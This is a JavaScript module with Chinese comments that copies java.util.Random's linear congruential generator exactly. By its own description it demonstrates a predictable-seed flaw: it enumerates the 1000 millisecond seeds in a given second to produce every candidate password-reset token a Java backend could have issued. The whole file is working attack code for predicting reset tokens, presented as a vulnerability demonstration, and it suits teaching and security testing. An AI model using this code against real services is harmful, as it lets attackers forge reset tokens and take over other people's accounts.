/**
 * 在 JS 中精确复刻 java.util.Random（线性同余生成器 LCG）。
 *
 * 用途：种子可预测漏洞演示——攻击者在浏览器里重建后端的随机数生成器，
 * 枚举候选种子即可算出后端生成的 reset token。
 *
 * Java 源码核心：
 *   构造时：seed = (userSeed ^ 0x5DEECE66D) & ((1<<48)-1)
 *   next(bits): seed = (seed * 0x5DEECE66D + 0xB) & ((1<<48)-1); return (int)(seed >>> (48-bits))
 *   nextLong(): return ((long)next(32) << 32) + next(32)
 *
 * 使用 BigInt 保证 48/64 位整数运算精度。
 */

const MULT = 0x5DEECE66Dn
const ADD = 0xBn
const MASK = (1n << 48n) - 1n

/**
 * 复刻 new Random(seed).nextLong()，并按 Java 的 Long.toHexString 输出（无符号十六进制）
 * @param {number|bigint} seedLong 种子（通常是毫秒时间戳）
 * @returns {string} 与 Java Long.toHexString(new Random(seed).nextLong()) 完全一致的字符串
 */
export function javaNextLongHex(seedLong) {
  let seed = (BigInt(seedLong) ^ MULT) & MASK

  const next = (bits) => {
    seed = (seed * MULT + ADD) & MASK
    // (int)(seed >>> (48 - bits))，结果按有符号 32 位返回
    return BigInt.asIntN(32, seed >> BigInt(48 - bits))
  }

  const hi = next(32)
  const lo = next(32)
  const raw = BigInt.asIntN(64, (hi << 32n) + lo)

  // Java 的 Long.toHexString 按无符号处理，且无前导零
  return BigInt.asUintN(64, raw).toString(16)
}

/**
 * 枚举某一秒内的 1000 个毫秒种子，生成全部候选 token。
 * @param {number} serverTimeSecond 抹成秒的毫秒时间戳（如 1781340570000）
 * @returns {Array<{seed:number, token:string}>} 1000 个候选
 */
export function generateCandidateTokens(serverTimeSecond) {
  const base = Number(serverTimeSecond)
  const candidates = []
  for (let ms = 0; ms < 1000; ms++) {
    const seed = base + ms
    candidates.push({ seed, token: javaNextLongHex(seed) })
  }
  return candidates
}
